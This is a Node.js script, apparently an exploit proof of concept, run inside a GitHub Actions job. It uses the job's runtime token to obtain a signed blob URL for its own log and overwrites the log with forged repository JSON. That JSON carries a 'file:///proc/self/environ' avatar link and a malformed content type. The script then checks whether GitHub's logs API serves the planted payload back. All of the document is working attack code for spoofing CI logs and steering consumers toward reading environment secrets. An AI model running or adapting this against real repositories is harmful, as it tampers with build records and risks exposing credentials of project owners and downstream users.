import https from 'node:https';

const runtimeToken = process.env.ACTIONS_RUNTIME_TOKEN;
const apiToken = process.env.GITHUB_TOKEN;
const resultsBase = process.env.ACTIONS_RESULTS_URL;
const repositoryName = process.env.GITHUB_REPOSITORY;
const runId = process.env.GITHUB_RUN_ID;

function request(url, options = {}, body = undefined) {
  return new Promise((resolve, reject) => {
    const req = https.request(url, options, response => {
      const chunks = [];
      response.on('data', chunk => chunks.push(chunk));
      response.on('end', () => resolve({status: response.statusCode, headers: response.headers, body: Buffer.concat(chunks)}));
    });
    req.on('error', reject);
    req.setTimeout(20000, () => req.destroy(new Error('request timeout')));
    if (body !== undefined) req.write(body);
    req.end();
  });
}
async function githubApi(path) {
  return request(`https://api.github.com/repos/${repositoryName}${path}`, {
    headers: {
      accept: 'application/vnd.github.v3+json',
      authorization: `Bearer ${apiToken}`,
      'user-agent': 'repo-cassette-job-log-carrier',
    },
  });
}
async function postReceiver(method, document) {
  const body = Buffer.from(JSON.stringify(document));
  return request(new URL(`/twirp/results.services.receiver.Receiver/${method}`, resultsBase), {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      accept: 'application/json',
      'content-type': 'application/json',
      'content-length': String(body.length),
    },
  }, body);
}

const claims = JSON.parse(Buffer.from(runtimeToken.split('.')[1], 'base64url'));
const scope = claims.scp.split(' ').find(value => value.startsWith('Actions.Results:'));
if (!scope) throw new Error('runtime token has no Actions.Results scope');
const [, workflowRunBackendId, workflowJobRunBackendId] = scope.split(':');

let jobId;
for (let attempt = 0; attempt < 60 && !jobId; attempt++) {
  const response = await githubApi(`/actions/runs/${runId}/jobs?filter=all`);
  if (response.status === 200) {
    const jobs = JSON.parse(response.body);
    jobId = jobs.jobs?.find(job => job.name === process.env.GITHUB_JOB)?.id ?? jobs.jobs?.[0]?.id;
  }
  if (!jobId) await new Promise(r => setTimeout(r, 250));
}
if (!jobId) throw new Error('could not discover REST job id');

const signedResponse = await postReceiver('GetJobLogsSignedBlobURL', {
  workflow_run_backend_id: workflowRunBackendId,
  workflow_job_run_backend_id: workflowJobRunBackendId,
});
if (signedResponse.status !== 200) throw new Error(`GetJobLogsSignedBlobURL ${signedResponse.status}: ${signedResponse.body}`);
const signed = JSON.parse(signedResponse.body);
const signedUrl = signed.logs_url;
if (!signedUrl) throw new Error('no logs_url');

const repository = `${repositoryName}/actions/jobs/${jobId}/logs`;
const payload = Buffer.from(JSON.stringify({
  full_name: repository,
  owner: {login: 'cassette', avatar_url: 'file:///proc/self/environ'},
  description: 'Repo Cassette carrier',
  stargazers_count: 0,
}));
const odd = 'application/json\x85';
const version = new URL(signedUrl).searchParams.get('sv') || '2025-11-05';

const created = await request(signedUrl, {
  method: 'PUT',
  headers: {
    'x-ms-version': version,
    'x-ms-blob-type': 'AppendBlob',
    'x-ms-blob-content-type': odd,
    'content-type': odd,
    'content-length': '0',
  },
}, '');
if (created.status !== 201) throw new Error(`create log ${created.status}: ${created.body.toString().slice(0,300)}`);

const uploaded = await request(`${signedUrl}&comp=appendblock&seal=true`, {
  method: 'PUT',
  headers: {
    'x-ms-version': version,
    'x-ms-blob-sealed': 'true',
    'x-ms-blob-content-type': odd,
    'content-type': odd,
    'content-length': String(payload.length),
  },
}, payload);
if (uploaded.status !== 201) throw new Error(`append log ${uploaded.status}: ${uploaded.body.toString().slice(0,300)}`);

console.log('CARRIER', JSON.stringify({repository, jobId, expectedBytes: payload.length, signedPermissions: new URL(signedUrl).searchParams.get('sp'), createStatus: created.status, appendStatus: uploaded.status}));

for (let attempt = 0; attempt < 20; attempt++) {
  const response = await githubApi(`/actions/jobs/${jobId}/logs`);
  if (response.status === 302) {
    const location = response.headers.location;
    const final = await request(location);
    console.log('CARRIER-HIT', JSON.stringify({
      repository,
      rsct: new URL(location).searchParams.get('rsct'),
      finalStatus: final.status,
      finalType: final.headers['content-type'],
      bodyMatch: final.body.equals(payload),
    }));
    process.exit(0);
  }
  await new Promise(r => setTimeout(r, 1000));
}
const last = await githubApi(`/actions/jobs/${jobId}/logs`);
console.log('CARRIER-MISS', JSON.stringify({status: last.status, type: last.headers['content-type'], body: last.body.toString().slice(0,200)}));
